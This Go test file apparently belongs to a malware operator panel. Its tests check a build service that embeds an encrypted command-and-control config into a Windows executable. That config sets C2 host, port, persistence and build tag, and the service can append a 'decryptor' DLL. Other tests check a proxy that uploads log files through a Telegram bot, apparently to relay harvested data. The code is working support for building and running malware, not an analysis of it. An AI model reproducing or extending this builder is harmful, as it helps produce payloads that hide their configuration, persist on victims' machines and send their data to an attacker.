package services_test

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"zialfi-panel/internal/services"
)

func makeTestPE(t *testing.T) []byte {
	t.Helper()

	dosHeader := []byte{
		'M', 'Z',
	}
	dosStub := make([]byte, 58)

	peOffset := make([]byte, 4)
	binary.LittleEndian.PutUint32(peOffset, 64)

	peSignature := []byte{'P', 'E', 0, 0}

	coffHeader := make([]byte, 20)
	binary.LittleEndian.PutUint16(coffHeader[0:2], 0x8664) // Machine: AMD64
	binary.LittleEndian.PutUint16(coffHeader[2:4], 2)      // NumberOfSections
	binary.LittleEndian.PutUint32(coffHeader[16:20], 0x10) // SizeOfOptionalHeader

	optionalHeader := make([]byte, 240)
	binary.LittleEndian.PutUint16(optionalHeader[0:2], 0x020B) // PE32+ magic

	sectionAlign := uint32(0x1000)
	fileAlign := uint32(0x200)
	binary.LittleEndian.PutUint32(optionalHeader[32:36], sectionAlign)
	binary.LittleEndian.PutUint32(optionalHeader[36:40], fileAlign)

	sectText := make([]byte, 40)
	copy(sectText[0:8], []byte(".text\x00\x00\x00"))
	binary.LittleEndian.PutUint32(sectText[16:20], 0x100)  // VirtualSize
	binary.LittleEndian.PutUint32(sectText[20:24], 0x1000) // VirtualAddress
	binary.LittleEndian.PutUint32(sectText[24:28], 0x100)  // SizeOfRawData
	binary.LittleEndian.PutUint32(sectText[28:32], 0x200)  // PointerToRawData

	placeholderSize := uint32(4096)
	sectRdata := make([]byte, 40)
	copy(sectRdata[0:8], []byte(".rdata\x00\x00\x00\x00"))
	binary.LittleEndian.PutUint32(sectRdata[16:20], placeholderSize)
	binary.LittleEndian.PutUint32(sectRdata[20:24], 0x2000)
	binary.LittleEndian.PutUint32(sectRdata[24:28], placeholderSize)
	binary.LittleEndian.PutUint32(sectRdata[28:32], 0x400)

	var buf bytes.Buffer
	buf.Write(dosHeader)
	buf.Write(dosStub)
	buf.Write(peOffset)
	buf.Write(peSignature)
	buf.Write(coffHeader)
	buf.Write(optionalHeader)
	buf.Write(sectText)
	buf.Write(sectRdata)
	peEnd := buf.Len()
	padTo := int(fileAlign)
	if peEnd%padTo != 0 {
		pad := padTo - (peEnd % padTo)
		buf.Write(make([]byte, pad))
	}

	buf.Write(make([]byte, 0x100))

	// Pad to align within section
	for buf.Len() < int(0x400) {
		buf.WriteByte(0)
	}

	configPlaceholder := make([]byte, placeholderSize)
	copy(configPlaceholder, []byte("MIRAGECFG"))
	buf.Write(configPlaceholder)

	return buf.Bytes()
}

func TestBuild_BasicPatch(t *testing.T) {
	pe := makeTestPE(t)
	svc := services.NewBuildService()

	// Find where MIRAGECFG is in the original PE
	origSigIdx := bytes.Index(pe, []byte("MIRAGECFG"))
	if origSigIdx < 0 {
		t.Fatal("MIRAGECFG not found in test PE")
	}

	config := services.BuildConfig{
		C2Host:           "192.168.1.100",
		C2Port:           8080,
		Persistence:      true,
		IncludeDecryptor: false,
		BuildTag:         "test-v1",
	}

	result, err := svc.Build(pe, nil, config)
	if err != nil {
		t.Fatal(err)
	}

	if len(result) < len(pe) {
		t.Fatal("result should not be smaller than input")
	}

	// MIRAGECFG should be preserved — Zig uses it to locate the config at runtime
	if !bytes.Contains(result, []byte("MIRAGECFG")) {
		t.Error("MIRAGECFG signature should be preserved for Zig config locator")
	}

	var cfg services.BuildConfig
	// Compute expected ciphertext size: JSON only (tag stored separately)
	jsonRaw, _ := json.Marshal(config)

	// Layout after MIRAGECFG: key(32) + nonce(12) + tag(16) + ciphertext(N)
	dataStart := origSigIdx + len("MIRAGECFG")
	key := result[dataStart : dataStart+32]
	nonce := result[dataStart+32 : dataStart+44]
	tag := result[dataStart+44 : dataStart+60]
	ciphertext := result[dataStart+60 : dataStart+60+len(jsonRaw)]

	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatal(err)
	}
	// Go's Open expects ciphertext || tag
	plaintext, err := gcm.Open(nil, nonce, append(ciphertext, tag...), nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		t.Fatal(err)
	}
	if cfg.C2Host != "192.168.1.100" {
		t.Errorf("C2Host = %q, want %q", cfg.C2Host, "192.168.1.100")
	}
	if cfg.C2Port != 8080 {
		t.Errorf("C2Port = %d, want %d", cfg.C2Port, 8080)
	}
	if !cfg.Persistence {
		t.Error("Persistence should be true")
	}
	if cfg.BuildTag != "test-v1" {
		t.Errorf("BuildTag = %q, want %q", cfg.BuildTag, "test-v1")
	}
}

func TestBuild_WithDecryptorOverlay(t *testing.T) {
	pe := makeTestPE(t)
	svc := services.NewBuildService()

	config := services.BuildConfig{
		C2Host: "10.0.0.1",
		C2Port: 443,
	}

	decryptor := []byte("MOCK_DECRYPTOR_DLL_DATA_12345")

	result, err := svc.Build(pe, decryptor, config)
	if err != nil {
		t.Fatal(err)
	}

	expectedSize := len(pe) + len(decryptor)
	if len(result) != expectedSize {
		t.Errorf("output size = %d, want %d", len(result), expectedSize)
	}

	if !bytes.HasSuffix(result, decryptor) {
		t.Error("output should end with decryptor DLL data")
	}
}

func TestBuild_MissingSignature(t *testing.T) {
	svc := services.NewBuildService()
	pe := make([]byte, 1024)
	for i := range pe {
		pe[i] = byte(i % 256)
	}

	config := services.BuildConfig{
		C2Host: "127.0.0.1",
		C2Port: 4444,
	}

	_, err := svc.Build(pe, nil, config)
	if err == nil {
		t.Fatal("expected error for missing MIRAGECFG signature")
	}
	if !strings.Contains(err.Error(), "MIRAGECFG") {
		t.Errorf("error = %q, want mention of MIRAGECFG", err.Error())
	}
}

func TestBuild_ConfigEncrypted(t *testing.T) {
	pe := makeTestPE(t)
	svc := services.NewBuildService()

	origSigIdx := bytes.Index(pe, []byte("MIRAGECFG"))
	if origSigIdx < 0 {
		t.Fatal("MIRAGECFG not found in test PE")
	}

	config := services.BuildConfig{
		C2Host: "c2.example.com",
		C2Port: 9999,
	}

	result, err := svc.Build(pe, nil, config)
	if err != nil {
		t.Fatal(err)
	}

	payloadAtSig := result[origSigIdx+9 : origSigIdx+256]

	jsonRaw, _ := json.Marshal(config)
	if bytes.Contains(payloadAtSig, jsonRaw) {
		t.Error("config appears as plaintext at MIRAGECFG offset — should be encrypted")
	}
}

func TestTelegram_SendLog(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/bottest123/sendDocument", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			t.Errorf("expected POST, got %s", r.Method)
		}
		ct := r.Header.Get("Content-Type")
		if !strings.HasPrefix(ct, "multipart/form-data") {
			t.Errorf("expected multipart/form-data, got %s", ct)
		}
		if err := r.ParseMultipartForm(1 << 20); err != nil {
			t.Fatal(err)
		}
		if r.FormValue("chat_id") != "12345" {
			t.Errorf("chat_id = %q, want %q", r.FormValue("chat_id"), "12345")
		}
		if r.FormValue("caption") != "test log" {
			t.Errorf("caption = %q, want %q", r.FormValue("caption"), "test log")
		}
		file, _, err := r.FormFile("document")
		if err != nil {
			t.Fatal(err)
		}
		content, _ := io.ReadAll(file)
		if string(content) != "log data here" {
			t.Errorf("file content = %q, want %q", string(content), "log data here")
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, `{"ok":true}`)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	proxy := services.NewTelegramProxy()
	proxy.BaseURL = server.URL

	err := proxy.SendLog("test123", "12345", []byte("log data here"), "log.txt", "test log")
	if err != nil {
		t.Fatal(err)
	}
}

func TestTelegram_TestToken(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/bottoken123/getMe", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, `{"ok":true,"result":{"id":123,"first_name":"TestBot","username":"test_bot"}}`)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	proxy := services.NewTelegramProxy()
	proxy.BaseURL = server.URL

	err := proxy.TestToken("token123")
	if err != nil {
		t.Fatal(err)
	}
}

func TestTelegram_TestTokenFail(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/bottoken456/getMe", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
		fmt.Fprint(w, `{"ok":false,"error_code":401,"description":"Unauthorized"}`)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	proxy := services.NewTelegramProxy()
	proxy.BaseURL = server.URL

	err := proxy.TestToken("token456")
	if err == nil {
		t.Fatal("expected error for unauthorized token")
	}
}

func TestTelegram_RetryOnFailure(t *testing.T) {
	attempt := 0
	mux := http.NewServeMux()
	mux.HandleFunc("/botretry/sendDocument", func(w http.ResponseWriter, r *http.Request) {
		attempt++
		if attempt < 2 {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, `{"ok":true}`)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	proxy := services.NewTelegramProxy()
	proxy.BaseURL = server.URL

	err := proxy.SendLog("retry", "999", []byte("data"), "file.txt", "caption")
	if err != nil {
		t.Fatal(err)
	}
	if attempt != 2 {
		t.Errorf("expected 2 attempts, got %d", attempt)
	}
}
